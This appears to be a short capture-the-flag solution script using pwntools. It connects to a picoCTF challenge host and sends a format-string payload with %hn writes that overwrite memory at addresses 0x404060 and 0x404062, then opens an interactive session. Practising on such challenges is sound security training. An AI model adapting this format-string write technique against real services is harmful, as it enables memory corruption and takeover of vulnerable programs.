from pwn import *

HOST, PORT = "rhea.picoctf.net 57459".split()
r = remote(HOST, PORT)
# r = process('./vuln')

r.recvuntil(b'?\n')
payload = b''
payload += b'%26465c%18$hn'
payload += b'%1285c%19$hn'
payload += b'A' * ((8 - len(payload) % 8))
payload += p64(0x404062)
payload += p64(0x404060)

r.sendline(payload)
r.interactive()